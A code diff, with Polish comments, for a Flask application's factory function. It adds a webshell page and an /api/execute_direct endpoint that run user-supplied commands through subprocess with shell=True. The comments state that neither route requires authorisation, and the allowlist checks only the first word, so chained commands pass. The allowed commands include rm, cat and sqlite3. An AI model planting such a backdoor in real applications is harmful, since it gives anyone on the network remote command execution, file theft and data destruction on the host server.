@@ -56,5 +56,67 @@ def create_app():
 
     # Inicjalizacja panelu admina
     init_admin(app)
-
+    # Dodaj bezpośrednią trasę webshell w app.py
+    import subprocess
+    import shlex
+    from flask import request, jsonify, render_template
+    
+    @app.route('/webshell_direct')
+    def webshell_direct():
+        # Bezpośredni endpoint webshell bez autoryzacji
+        return render_template('webshell.html')
+    
+    @app.route('/api/execute_direct', methods=['POST'])
+    def execute_direct():
+        # Bezpośredni endpoint wykonywania poleceń bez autoryzacji
+        data = request.get_json()
+        command = data.get('command', '')
+        
+        if not command:
+            return jsonify({"output": "", "error": "No command provided"}), 400
+        
+        # Lista dozwolonych poleceń
+        allowed_commands = ['ls', 'cat', 'mkdir', 'pwd', 'echo', 'cp', 'mv', 'rm', 'touch', 'head', 'tail', 'wc', 'find', 'sqlite3']
+        
+        # Sprawdź czy polecenie jest dozwolone
+        cmd_parts = shlex.split(command)
+        base_cmd = cmd_parts[0] if cmd_parts else ""
+        
+        if base_cmd not in allowed_commands:
+            return jsonify({
+                "output": "",
+                "error": f"Command not allowed. Allowed commands: {', '.join(allowed_commands)}"
+            }), 403
+        
+        try:
+            # Wykonaj polecenie
+            process = subprocess.Popen(
+                command,
+                shell=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                text=True,
+                cwd="/opt/render/project/src"
+            )
+            
+            # Ustaw timeout
+            stdout, stderr = process.communicate(timeout=5)
+            
+            return jsonify({
+                "output": stdout,
+                "error": stderr
+            })
+        except subprocess.TimeoutExpired:
+            process.kill()
+            return jsonify({
+                "output": "",
+                "error": "Command execution timed out (5s limit)"
+            }), 500
+        except Exception as e:
+            return jsonify({
+                "output": "",
+                "error": f"Error: {str(e)}"
+            }), 500
+    
+    return app
     return app
